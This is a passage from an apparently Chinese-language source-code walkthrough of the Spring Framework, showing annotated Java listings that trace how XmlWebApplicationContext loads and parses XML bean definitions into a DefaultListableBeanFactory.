<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DefaultListableBeanFactory</span><span class="params">(BeanFactory parentBeanFactory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(parentBeanFactory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bean名称与定义对应的map集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, BeanDefinition&gt; beanDefinitionMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, BeanDefinition&gt;(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bean名称的list集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> List&lt;String&gt; beanDefinitionNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(<span class="number">256</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory#AbstractAutowireCapableBeanFactory(org.springframework.beans.factory.BeanFactory)</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractAutowireCapableBeanFactory</span><span class="params">(BeanFactory parentBeanFactory)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>();</span><br><span class="line">    setParentBeanFactory(parentBeanFactory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractAutowireCapableBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    ignoreDependencyInterface(BeanNameAware.class);</span><br><span class="line">    ignoreDependencyInterface(BeanFactoryAware.class);</span><br><span class="line">    ignoreDependencyInterface(BeanClassLoaderAware.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Class&lt;?&gt;&gt; ignoredDependencyInterfaces = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Class&lt;?&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ignoreDependencyInterface</span><span class="params">(Class&lt;?&gt; ifc)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ignoredDependencyInterfaces.add(ifc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>org.springframework.beans.factory.support.AbstractBeanFactory#AbstractBeanFactory()</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractBeanFactory</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>DefaultListableBeanFactory继承关系图：</p>
<p><img src="/../img/DefaultListableBeanFactory.png" alt="DefaultListableBeanFactory继承关系图"></p>
<h3 id="代码3-2-3"><a href="#代码3-2-3" class="headerlink" title="代码3.2.3"></a>代码3.2.3</h3><p>org.springframework.context.support.AbstractRefreshableApplicationContext#customizeBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">customizeBeanFactory</span><span class="params">(DefaultListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// 设置bean定义覆盖</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.allowBeanDefinitionOverriding != <span class="literal">null</span>) &#123;</span><br><span class="line">        beanFactory.setAllowBeanDefinitionOverriding(<span class="built_in">this</span>.allowBeanDefinitionOverriding);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置循环依赖</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.allowCircularReferences != <span class="literal">null</span>) &#123;</span><br><span class="line">        beanFactory.setAllowCircularReferences(<span class="built_in">this</span>.allowCircularReferences);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-4"><a href="#代码3-2-4" class="headerlink" title="代码3.2.4"></a>代码3.2.4</h3><p>org.springframework.web.context.support.XmlWebApplicationContext#loadBeanDefinitions(org.springframework.beans.factory.support.DefaultListableBeanFactory)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(DefaultListableBeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException, IOException &#123;</span><br><span class="line">    <span class="comment">// Create a new XmlBeanDefinitionReader for the given BeanFactory.</span></span><br><span class="line">    <span class="comment">// 创建XmlBeanDefinitionReader</span></span><br><span class="line">    <span class="type">XmlBeanDefinitionReader</span> <span class="variable">beanDefinitionReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XmlBeanDefinitionReader</span>(beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Configure the bean definition reader with this context&#x27;s</span></span><br><span class="line">    <span class="comment">// resource loading environment.</span></span><br><span class="line">    beanDefinitionReader.setEnvironment(getEnvironment());</span><br><span class="line">    beanDefinitionReader.setResourceLoader(<span class="built_in">this</span>);</span><br><span class="line">    beanDefinitionReader.setEntityResolver(<span class="keyword">new</span> <span class="title class_">ResourceEntityResolver</span>(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allow a subclass to provide custom initialization of the reader,</span></span><br><span class="line">    <span class="comment">// then proceed with actually loading the bean definitions.</span></span><br><span class="line">    initBeanDefinitionReader(beanDefinitionReader);</span><br><span class="line">    <span class="comment">// 加载bean定义，详细：代码3.2.5</span></span><br><span class="line">    loadBeanDefinitions(beanDefinitionReader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-5"><a href="#代码3-2-5" class="headerlink" title="代码3.2.5"></a>代码3.2.5</h3><p>org.springframework.web.context.support.XmlWebApplicationContext#loadBeanDefinitions(org.springframework.beans.factory.xml.XmlBeanDefinitionReader)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(XmlBeanDefinitionReader reader)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 获取配置文件位置</span></span><br><span class="line">    String[] configLocations = getConfigLocations();</span><br><span class="line">    <span class="keyword">if</span> (configLocations != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 遍历所有配置文件（如果存在多个）</span></span><br><span class="line">        <span class="keyword">for</span> (String configLocation : configLocations) &#123;</span><br><span class="line">            <span class="comment">// 加载bean定义，详细：代码3.2.6</span></span><br><span class="line">            reader.loadBeanDefinitions(configLocation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-6"><a href="#代码3-2-6" class="headerlink" title="代码3.2.6"></a>代码3.2.6</h3><p>org.springframework.beans.factory.support.AbstractBeanDefinitionReader#loadBeanDefinitions(java.lang.String)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(String location)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    <span class="comment">// 加载bean定义，详细：代码3.2.7</span></span><br><span class="line">    <span class="keyword">return</span> loadBeanDefinitions(location, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-7"><a href="#代码3-2-7" class="headerlink" title="代码3.2.7"></a>代码3.2.7</h3><p>org.springframework.beans.factory.support.AbstractBeanDefinitionReader#loadBeanDefinitions(java.lang.String, java.util.Set&lt;org.springframework.core.io.Resource&gt;)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(String location, Set&lt;Resource&gt; actualResources)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    <span class="type">ResourceLoader</span> <span class="variable">resourceLoader</span> <span class="operator">=</span> getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (resourceLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(</span><br><span class="line">            <span class="string">&quot;Cannot import bean definitions from location [&quot;</span> + location + <span class="string">&quot;]: no ResourceLoader available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resourceLoader <span class="keyword">instanceof</span> ResourcePatternResolver) &#123;</span><br><span class="line">        <span class="comment">// Resource pattern matching available.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 把配置文件加载成Resource数组，location可能有classpath*:等多种通配符方式，因此可能加载到多个</span></span><br><span class="line">            Resource[] resources = ((ResourcePatternResolver) resourceLoader).getResources(location);</span><br><span class="line">            <span class="comment">// 加载bean定义，详细：代码3.2.8</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">loadCount</span> <span class="operator">=</span> loadBeanDefinitions(resources);</span><br><span class="line">            <span class="keyword">if</span> (actualResources != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Resource resource : resources) &#123;</span><br><span class="line">                    actualResources.add(resource);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                logger.debug(<span class="string">&quot;Loaded &quot;</span> + loadCount + <span class="string">&quot; bean definitions from location pattern [&quot;</span> + location + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> loadCount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(</span><br><span class="line">                <span class="string">&quot;Could not resolve bean definition resource pattern [&quot;</span> + location + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Can only load single resources by absolute URL.</span></span><br><span class="line">        <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> resourceLoader.getResource(location);</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadCount</span> <span class="operator">=</span> loadBeanDefinitions(resource);</span><br><span class="line">        <span class="keyword">if</span> (actualResources != <span class="literal">null</span>) &#123;</span><br><span class="line">            actualResources.add(resource);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Loaded &quot;</span> + loadCount + <span class="string">&quot; bean definitions from location [&quot;</span> + location + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> loadCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-8"><a href="#代码3-2-8" class="headerlink" title="代码3.2.8"></a>代码3.2.8</h3><p>org.springframework.beans.factory.support.AbstractBeanDefinitionReader#loadBeanDefinitions(org.springframework.core.io.Resource…)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(Resource... resources)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    Assert.notNull(resources, <span class="string">&quot;Resource array must not be null&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Resource resource : resources) &#123;</span><br><span class="line">        <span class="comment">// 加载bean定义，详细：代码3.2.9</span></span><br><span class="line">        counter += loadBeanDefinitions(resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> counter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-9"><a href="#代码3-2-9" class="headerlink" title="代码3.2.9"></a>代码3.2.9</h3><p>org.springframework.beans.factory.xml.XmlBeanDefinitionReader#loadBeanDefinitions(org.springframework.core.io.Resource)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    <span class="comment">// 加载bean定义，详细：代码3.2.10</span></span><br><span class="line">    <span class="keyword">return</span> loadBeanDefinitions(<span class="keyword">new</span> <span class="title class_">EncodedResource</span>(resource));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-10"><a href="#代码3-2-10" class="headerlink" title="代码3.2.10"></a>代码3.2.10</h3><p>org.springframework.beans.factory.xml.XmlBeanDefinitionReader#loadBeanDefinitions(org.springframework.core.io.support.EncodedResource)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(EncodedResource encodedResource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    Assert.notNull(encodedResource, <span class="string">&quot;EncodedResource must not be null&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Loading XML bean definitions from &quot;</span> + encodedResource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Set&lt;EncodedResource&gt; currentResources = <span class="built_in">this</span>.resourcesCurrentlyBeingLoaded.get();</span><br><span class="line">    <span class="keyword">if</span> (currentResources == <span class="literal">null</span>) &#123;</span><br><span class="line">        currentResources = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;EncodedResource&gt;(<span class="number">4</span>);</span><br><span class="line">        <span class="built_in">this</span>.resourcesCurrentlyBeingLoaded.set(currentResources);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把encodedResource保存到Set中，而这个Set保存到ThreadLocal（resourcesCurrentlyBeingLoaded）中，加载完成后，finally中会移除</span></span><br><span class="line">    <span class="keyword">if</span> (!currentResources.add(encodedResource)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(</span><br><span class="line">            <span class="string">&quot;Detected cyclic loading of &quot;</span> + encodedResource + <span class="string">&quot; - check your import definitions!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> encodedResource.getResource().getInputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream);</span><br><span class="line">            <span class="keyword">if</span> (encodedResource.getEncoding() != <span class="literal">null</span>) &#123;</span><br><span class="line">                inputSource.setEncoding(encodedResource.getEncoding());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 加载bean定义，详细：代码3.2.11</span></span><br><span class="line">            <span class="keyword">return</span> doLoadBeanDefinitions(inputSource, encodedResource.getResource());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(</span><br><span class="line">            <span class="string">&quot;IOException parsing XML document from &quot;</span> + encodedResource.getResource(), ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        currentResources.remove(encodedResource);</span><br><span class="line">        <span class="keyword">if</span> (currentResources.isEmpty()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.resourcesCurrentlyBeingLoaded.remove();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-11"><a href="#代码3-2-11" class="headerlink" title="代码3.2.11"></a>代码3.2.11</h3><p>org.springframework.beans.factory.xml.XmlBeanDefinitionReader#doLoadBeanDefinitions</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">doLoadBeanDefinitions</span><span class="params">(InputSource inputSource, Resource resource)</span></span><br><span class="line">    <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用SAX解析spring的配置文件，构成Document对象</span></span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> doLoadDocument(inputSource, resource);</span><br><span class="line">        <span class="comment">// 注册bean定义到BeanFactory，详细：代码3.2.12</span></span><br><span class="line">        <span class="keyword">return</span> registerBeanDefinitions(doc, resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (BeanDefinitionStoreException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SAXParseException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">XmlBeanDefinitionStoreException</span>(resource.getDescription(),</span><br><span class="line">                                                  <span class="string">&quot;Line &quot;</span> + ex.getLineNumber() + <span class="string">&quot; in XML document from &quot;</span> + resource + <span class="string">&quot; is invalid&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SAXException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">XmlBeanDefinitionStoreException</span>(resource.getDescription(),</span><br><span class="line">                                                  <span class="string">&quot;XML document from &quot;</span> + resource + <span class="string">&quot; is invalid&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ParserConfigurationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(resource.getDescription(),</span><br><span class="line">                                               <span class="string">&quot;Parser configuration exception parsing XML from &quot;</span> + resource, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(resource.getDescription(),</span><br><span class="line">                                               <span class="string">&quot;IOException parsing XML document from &quot;</span> + resource, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(resource.getDescription(),</span><br><span class="line">                                               <span class="string">&quot;Unexpected exception parsing XML document from &quot;</span> + resource, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-12"><a href="#代码3-2-12" class="headerlink" title="代码3.2.12"></a>代码3.2.12</h3><p>org.springframework.beans.factory.xml.XmlBeanDefinitionReader#registerBeanDefinitions</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(Document doc, Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line">    <span class="comment">// 创建BeanDefinitionDocumentReader</span></span><br><span class="line">    <span class="type">BeanDefinitionDocumentReader</span> <span class="variable">documentReader</span> <span class="operator">=</span> createBeanDefinitionDocumentReader();</span><br><span class="line">    <span class="type">int</span> <span class="variable">countBefore</span> <span class="operator">=</span> getRegistry().getBeanDefinitionCount();</span><br><span class="line">    <span class="comment">// 注册bean定义到BeanFactory，详细：代码3.2.13</span></span><br><span class="line">    documentReader.registerBeanDefinitions(doc, createReaderContext(resource));</span><br><span class="line">    <span class="keyword">return</span> getRegistry().getBeanDefinitionCount() - countBefore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射，通过this.documentReaderClass类的构造器，创建实例，并强制转为BeanDefinitionDocumentReader类型</span></span><br><span class="line"><span class="keyword">protected</span> BeanDefinitionDocumentReader <span class="title function_">createBeanDefinitionDocumentReader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> BeanDefinitionDocumentReader.class.cast(BeanUtils.instantiateClass(<span class="built_in">this</span>.documentReaderClass));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-13"><a href="#代码3-2-13" class="headerlink" title="代码3.2.13"></a>代码3.2.13</h3><p>org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader#registerBeanDefinitions</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(Document doc, XmlReaderContext readerContext)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.readerContext = readerContext;</span><br><span class="line">    logger.debug(<span class="string">&quot;Loading bean definitions&quot;</span>);</span><br><span class="line">    <span class="type">Element</span> <span class="variable">root</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">    <span class="comment">// 注册bean定义到BeanFactory，详细：代码3.2.14</span></span><br><span class="line">    doRegisterBeanDefinitions(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-14"><a href="#代码3-2-14" class="headerlink" title="代码3.2.14"></a>代码3.2.14</h3><p>org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader#doRegisterBeanDefinitions</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doRegisterBeanDefinitions</span><span class="params">(Element root)</span> &#123;</span><br><span class="line">    <span class="comment">// Any nested &lt;beans&gt; elements will cause recursion in this method. In</span></span><br><span class="line">    <span class="comment">// order to propagate and preserve &lt;beans&gt; default-* attributes correctly,</span></span><br><span class="line">    <span class="comment">// keep track of the current (parent) delegate, which may be null. Create</span></span><br><span class="line">    <span class="comment">// the new (child) delegate with a reference to the parent for fallback purposes,</span></span><br><span class="line">    <span class="comment">// then ultimately reset this.delegate back to its original (parent) reference.</span></span><br><span class="line">    <span class="comment">// this behavior emulates a stack of delegates without actually necessitating one.</span></span><br><span class="line">    <span class="type">BeanDefinitionParserDelegate</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.delegate;</span><br><span class="line">    <span class="built_in">this</span>.delegate = createDelegate(getReaderContext(), root, parent);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定元素节点（这里为root）的xmlns为空，或者是http://www.springframework.org/schema/beans，则为默认名称空间</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">profileSpec</span> <span class="operator">=</span> root.getAttribute(PROFILE_ATTRIBUTE);</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(profileSpec)) &#123;</span><br><span class="line">            String[] specifiedProfiles = StringUtils.tokenizeToStringArray(</span><br><span class="line">                profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);</span><br><span class="line">            <span class="keyword">if</span> (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">                    logger.info(<span class="string">&quot;Skipped XML bean definition file due to specified profiles [&quot;</span> + profileSpec +</span><br><span class="line">                                <span class="string">&quot;] not matching: &quot;</span> + getReaderContext().getResource());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理前：为空，拓展点</span></span><br><span class="line">    preProcessXml(root);</span><br><span class="line">    <span class="comment">// 解析xml，详细：代码3.2.15</span></span><br><span class="line">    parseBeanDefinitions(root, <span class="built_in">this</span>.delegate);</span><br><span class="line">    <span class="comment">// 处理后：为空，拓展点</span></span><br><span class="line">    postProcessXml(root);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.delegate = parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-15（区分点）"><a href="#代码3-2-15（区分点）" class="headerlink" title="代码3.2.15（区分点）"></a>代码3.2.15（区分点）</h3><p>org.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader#parseBeanDefinitions</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line">        <span class="comment">// 遍历所有子节点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nl.item(i);</span><br><span class="line">            <span class="comment">// 如果为Element节点，则进行处理（可能为注释，或者换行等不需要处理的节点）</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">                <span class="type">Element</span> <span class="variable">ele</span> <span class="operator">=</span> (Element) node;</span><br><span class="line">                <span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line">                    <span class="comment">// 处理名称空间为空或http://www.springframework.org/schema/beans的节点，</span></span><br><span class="line">                    <span class="comment">// 比如：bean，import，alias等，详细：代码3.2.28，这里以bean为例</span></span><br><span class="line">                    parseDefaultElement(ele, delegate);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 处理非默认名称空间的节点，比如：context:component-scan等，详细：代码3.2.16</span></span><br><span class="line">                    delegate.parseCustomElement(ele);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        delegate.parseCustomElement(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-2-16"><a href="#代码3-2-16" class="headerlink" title="代码3.2.16"></a>代码3.2.16</h3><p>org.springframework.beans.factory.xml.BeanDefinitionParserDelegate#parseCustomElement(org.w3c.dom.Element)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> BeanDefinition <span class="title function_">parseCustomElement</span><span class="params">(Element ele)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> parseCustomElement(ele, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> BeanDefinition <span class="title function_">parseCustomElement</span><span class="params">(Element ele, BeanDefinition containingBd)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取节点所属的名称空间，如：context:component-scan所属名称空间为：http://www.springframework.org/schema/context</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">namespaceUri</span> <span class="operator">=</span> getNamespaceURI(ele);</span><br><span class="line">    <span class="comment">// 由下图可知，context:component-scan名称空间对应的名称空间处理器为：ContextNamespaceHandler，resolve详细：代码3.2.17</span></span><br><span class="line">    <span class="type">NamespaceHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="built_in">this</span>.readerContext.getNamespaceHandlerResolver().resolve(namespaceUri);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;Unable to locate Spring NamespaceHandler for XML schema namespace [&quot;</span> + namespaceUri + <span class="string">&quot;]&quot;</span>, ele);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用名称空间处理器的parse方法，详细：代码3.2.19，以ContextNamespaceHandler为例</span></span><br><span class="line">    <span class="keyword">return</span> handler.parse(ele, <span class="keyword">new</span> <span class="title class_">ParserContext</span>(<span class="built_in">this</span>.readerContext, <span class="built_in">this</span>, containingBd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

